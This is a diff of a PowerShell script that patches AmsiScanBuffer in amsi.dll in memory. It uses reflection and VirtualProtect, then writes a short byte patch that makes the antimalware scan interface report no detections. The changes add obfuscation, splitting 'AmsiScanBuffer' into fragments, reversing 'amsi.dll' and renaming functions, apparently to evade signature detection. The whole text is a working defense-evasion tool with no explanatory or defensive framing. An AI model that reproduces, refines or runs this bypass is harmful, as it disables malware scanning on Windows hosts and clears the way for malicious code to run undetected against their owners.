@@ -1,4 +1,4 @@
-function Itay {
+function func {
     Param ($moduleName, $bananationName)
     $myass = ([AppDomain]::CurrentDomain.GetAssemblies() |
     Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
@@ -11,7 +11,7 @@ function Itay {
 }
 
 
-function getDelegateType {
+function My {
     Param (
      [Parameter(Position = 0, Mandatory = $True)] [Type[]]
      $banana, [Parameter(Position = 1)] [Type] $delType = [Void]
@@ -36,12 +36,15 @@ $banana). SetImplementationFlags('Runtime, Managed')
 
 
 $a="A"
-$b="msiS"
-$c="canB"
-$d="uffer"
-[IntPtr]$bananaAddr = Itay amsi.dll ($a+$b+$c+$d)
+$b="ms"
+$c="iS"
+$d="canB"
+$e="uffer"
+$com = ($a,$b,$c,$d,$e -Join '')
+$rev = "lld.isma"
+[IntPtr]$bananaAddr = func (([regex]::Matches($rev,'.','RightToLeft') | ForEach {$_.value}) -join '') $com
 $oldProtectionBuffer = 0
-$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Itay kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func kernel32.dll VirtualProtect), (My @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
 $vp.Invoke($bananaAddr, 3, 0x40, [ref]$oldProtectionBuffer)
 $buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $bananaAddr, 12)
